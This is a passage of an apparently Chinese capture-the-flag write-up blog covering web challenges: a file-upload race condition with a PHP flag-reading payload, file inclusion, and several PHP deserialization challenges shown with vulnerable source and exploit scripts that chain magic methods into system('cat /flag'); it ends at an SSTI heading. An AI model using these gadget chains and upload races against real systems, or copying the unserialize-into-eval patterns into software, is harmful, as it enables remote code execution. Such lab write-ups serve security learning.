<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">仅受天道认可的「净化符文」可修复玉魄（扩展名：.jpg/.png/.gif）</span><br><span class="line">符文尺寸不得大于三寸（30000字节）</span><br><span class="line">符文上传后将进行「重命名净化」</span><br><span class="line">魔气会快速清除违规符文，请把握时机！</span><br></pre></td></tr></table></figure>
<p>可知：</p>
<ol>
<li>白名单</li>
<li>大小限制</li>
<li>重命名</li>
<li>条件竞争</li>
</ol>
<p>上传双后缀可行。</p>
<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/images/20250823140558.png" alt="20250823140558"></p>
<p>验证条件竞争成功。</p>
<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/images/20250823141815.png" alt="20250823141815"></p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);<span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure>
<p>竞争成功：<br><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/images/20250823144833.png" alt="20250823144833"></p>
<h3 id="16-第十六章-昆仑星途"><a href="#16-第十六章-昆仑星途" class="headerlink" title="16 第十六章 昆仑星途"></a><strong>16 第十六章 昆仑星途</strong></h3><p>考点： 文件包含，伪协议</p>
<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/images/20250823103625.png" alt="20250823103625"></p>
<h3 id="17-第十七章-星骸迷阵·神念重构"><a href="#17-第十七章-星骸迷阵·神念重构" class="headerlink" title="17 第十七章 星骸迷阵·神念重构"></a><strong>17 第十七章 星骸迷阵·神念重构</strong></h3><p>考点：php反序列化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> A;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<h3 id="18-第十八章-万卷诡阁·功法连环"><a href="#18-第十八章-万卷诡阁·功法连环" class="headerlink" title="18 第十八章 万卷诡阁·功法连环"></a><strong>18 第十八章 万卷诡阁·功法连环</strong></h3><p>考点： php反序列化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonA</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$name</span>=<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="variable">$name</span>-&gt;<span class="title function_ invoke__">work</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonB</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">work</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$name</span>=<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$name</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;person&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;person&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonA</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>; <span class="comment">// 在构造阶段就写入</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonB</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PersonB</span>();</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PersonA</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$b</span>-&gt;name = <span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="19-第十九章-星穹真相·补天归源"><a href="#19-第十九章-星穹真相·补天归源" class="headerlink" title="19 第十九章 星穹真相·补天归源"></a><strong>19 第十九章 星穹真相·补天归源</strong></h3><p>考点：php反序列化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;id;</span><br><span class="line">        <span class="variable">$name</span>-&gt;name = <span class="variable">$id</span>;</span><br><span class="line">        <span class="variable">$name</span>-&gt;age = <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonA</span> <span class="keyword">extends</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="variable">$id</span> = <span class="variable language_">$this</span>-&gt;id;</span><br><span class="line">        <span class="variable">$age</span> = <span class="variable language_">$this</span>-&gt;age;</span><br><span class="line">        <span class="variable">$name</span>-&gt;<span class="variable">$id</span>(<span class="variable">$age</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonB</span> <span class="keyword">extends</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonC</span> <span class="keyword">extends</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__Check</span>(<span class="params"><span class="variable">$age</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">str_contains</span>(<span class="variable">$this</span>-&gt;age . <span class="variable">$this</span>-&gt;name,<span class="string">&quot;flag&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="variable">$name</span>(<span class="variable">$age</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$age</span> = <span class="variable language_">$this</span>-&gt;age;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;id;</span><br><span class="line">        <span class="variable">$name</span>-&gt;age = <span class="variable">$age</span>; <span class="comment">// ($c-&gt;id)-&gt;age = $c-&gt;age;</span></span><br><span class="line">        <span class="variable">$name</span>(<span class="variable language_">$this</span>); <span class="comment">// 调用$c-&gt;id-&gt;__invoke($c);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;person&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$person</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;person&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>分析：</p>
<p>入口函数是<code>__wakeup</code>-&gt;然后触发<code>__invoke</code>-&gt;触发&#96;&#96;</p>
<p>exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 与题面一致的“同名类”用于本地序列化</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$name</span>; <span class="keyword">public</span> <span class="variable">$id</span>; <span class="keyword">public</span> <span class="variable">$age</span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonA</span> <span class="keyword">extends</span> <span class="title">Person</span> </span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonB</span> <span class="keyword">extends</span> <span class="title">Person</span> </span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonC</span> <span class="keyword">extends</span> <span class="title">Person</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2) 让 PersonA::__destruct() -&gt; PersonC::__Check($arg) 成立：$a-&gt;id=&quot;__Check&quot;</span></span><br><span class="line"><span class="comment">// 3) 让 PersonC-&gt;__Check($arg) 调用 `$this-&gt;name($arg)`，于是把 $c-&gt;name 设为 &quot;system&quot;（或 &quot;passthru&quot;/&quot;shell_exec&quot;）。</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PersonC</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;name = <span class="string">&#x27;system&#x27;</span>;  <span class="comment">// 让 __Check($arg) 调用 system($arg)</span></span><br><span class="line"><span class="comment">// 若赛题的 wakeup 对 age 有检查（比如必须是 &quot;bbb&quot;），可以保留：</span></span><br><span class="line"><span class="variable">$c</span>-&gt;age  = <span class="string">&#x27;bbb&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PersonA</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;id   = <span class="string">&#x27;__Check&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 把要执行的命令放在 *会传给 __Check 的那个参数* 上</span></span><br><span class="line"><span class="comment">// 从你的栈看，__destruct() 传的是 &#x27;whoami&#x27;，很可能来自 $a-&gt;age</span></span><br><span class="line"><span class="variable">$a</span>-&gt;age  = <span class="string">&#x27;cat /fl*&#x27;</span>;   </span><br><span class="line"></span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$ser</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h3 id="19-第十九章-revenge"><a href="#19-第十九章-revenge" class="headerlink" title="19 第十九章_revenge"></a><strong>19 第十九章_revenge</strong></h3><p>考点：php反序列化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonA</span> <span class="keyword">extends</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="variable">$id</span> = <span class="variable language_">$this</span>-&gt;id;</span><br><span class="line">        <span class="variable">$name</span>-&gt;<span class="variable">$id</span>(<span class="variable language_">$this</span>-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonB</span> <span class="keyword">extends</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;id;</span><br><span class="line">        <span class="variable">$name</span>-&gt;name = <span class="variable">$id</span>;</span><br><span class="line">        <span class="variable">$name</span>-&gt;age = <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonC</span> <span class="keyword">extends</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$age</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$name</span>=<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$age</span> == <span class="literal">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Age can&#x27;t be empty.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$name</span> === <span class="string">&quot;system&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>(<span class="variable">$name</span>(<span class="variable">$age</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;id;</span><br><span class="line">        <span class="variable">$name</span>-&gt;age = <span class="variable language_">$this</span>-&gt;age;</span><br><span class="line">        <span class="variable">$name</span>(<span class="variable language_">$this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;person&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$person</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;person&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 与题面一致的“同名类”用于本地序列化</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$name</span>; <span class="keyword">public</span> <span class="variable">$id</span>; <span class="keyword">public</span> <span class="variable">$age</span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonA</span> <span class="keyword">extends</span> <span class="title">Person</span> </span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonB</span> <span class="keyword">extends</span> <span class="title">Person</span> </span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonC</span> <span class="keyword">extends</span> <span class="title">Person</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// $c:__wakeup()-&gt;         $a:__destruct()-&gt;$c:__Check()</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PersonA</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PersonC</span>();</span><br><span class="line"><span class="variable">$person</span> = <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;name = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;id = <span class="string">&quot;__Check&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;age = <span class="string">&quot;cat /fla?&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>-&gt;name = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;id = <span class="variable">$person</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;age = <span class="number">18</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h2><h3 id="这是…Webshell？"><a href="#这是…Webshell？" class="headerlink" title="这是…Webshell？"></a><strong>这是…Webshell？</strong></h3><p>这两道题目确实又要感慨p神好强啊，感觉很多题目的来源全都是他的文章。<br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell | 离别歌</a></p>
<h3 id="这是…Webshell-revenge"><a href="#这是…Webshell-revenge" class="headerlink" title="这是…Webshell?_revenge"></a><strong>这是…Webshell?_revenge</strong></h3><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇 | 离别歌</a></p>
<h3 id="20-第二十章-幽冥血海·幻语心魔"><a href="#20-第二十章-幽冥血海·幻语心魔" class="headerlink" title="20 第二十章 幽冥血海·幻语心魔"></a><strong>20 第二十章 幽冥血海·幻语心魔</strong></h3><p>考点：SSTI</p>
<p>源码：</p>
